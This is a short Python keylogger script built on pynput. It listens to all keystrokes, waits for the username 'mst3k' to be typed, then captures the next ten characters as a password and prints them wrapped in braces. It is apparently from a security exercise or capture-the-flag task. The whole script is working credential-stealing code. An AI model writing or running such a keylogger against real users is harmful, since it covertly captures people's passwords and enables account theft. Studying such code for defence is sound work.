from pynput import keyboard
targetUser = "mst3k"
currWord = ""
password = ""

def on_press(key, injected):
    global currWord, password
    try:
        if (currWord == targetUser):
            password += key.char
        elif (key.char == list(targetUser)[len(currWord)]):
            currWord += key.char
        else:
            currWord = ""

        if (len(password) == 10):
            print(f"{{{password}}}")
            password = ""
            currWord = ""
    except AttributeError:
        pass

def on_release(key, injected):
    if key == keyboard.Key.esc:
    # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()